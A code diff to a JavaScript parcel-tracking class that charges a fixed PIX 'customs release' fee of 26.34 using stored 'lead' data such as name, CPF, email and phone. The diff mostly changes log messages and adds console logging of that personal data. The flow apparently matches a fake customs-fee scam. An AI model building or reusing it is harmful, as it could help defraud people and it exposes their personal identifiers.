@@ -982,7 +982,13 @@ export class TrackingSystem {
 
     async generatePixForLiberation() {
         try {
-            console.log('Gerando PIX para liberação aduaneira...');
+            console.log('💳 GERANDO PIX PARA LIBERAÇÃO ADUANEIRA...');
+            console.log('📦 Dados do lead para PIX:', {
+                nome: this.leadData?.nome_completo,
+                cpf: this.leadData?.cpf,
+                email: this.leadData?.email,
+                telefone: this.leadData?.telefone
+            });
             
             // Usar dados do lead do banco de dados
             const userData = {
@@ -995,7 +1001,8 @@ export class TrackingSystem {
             const pixResult = await this.zentraPayService.createPixTransaction(userData, 26.34);
             
             if (pixResult.success) {
-                console.log('✅ PIX gerado com sucesso via Zentra Pay!');
+                console.log('🎉 PIX GERADO COM SUCESSO VIA ZENTRA PAY!');
+                console.log('📋 PIX Payload:', pixResult.pixPayload?.substring(0, 50) + '...');
                 
                 // Atualizar QR Code e código PIX no modal
                 const qrCodeImg = document.getElementById('realPixQrCode');
@@ -1003,12 +1010,12 @@ export class TrackingSystem {
                 
                 if (qrCodeImg && pixResult.pixPayload) {
                     qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixResult.pixPayload)}`;
-                    console.log('🖼️ QR Code atualizado com PIX real');
+                    console.log('🖼️ QR CODE ATUALIZADO COM PIX REAL');
                 }
                 
                 if (pixCodeInput && pixResult.pixPayload) {
                     pixCodeInput.value = pixResult.pixPayload;
-                    console.log('📋 Código PIX atualizado no modal');
+                    console.log('📋 CÓDIGO PIX ATUALIZADO NO MODAL');
                 }
                 
                 this.pixData = pixResult;
@@ -1017,7 +1024,7 @@ export class TrackingSystem {
             }
             
         } catch (error) {
-            console.warn('⚠️ Erro ao gerar PIX via API, usando link direto Zentra Pay:', error);
+            console.warn('⚠️ ERRO AO GERAR PIX VIA API, USANDO LINK DIRETO ZENTRA PAY:', error);
             // Fallback: Adicionar link direto do Zentra Pay
             this.addZentraPayDirectLink();
         }
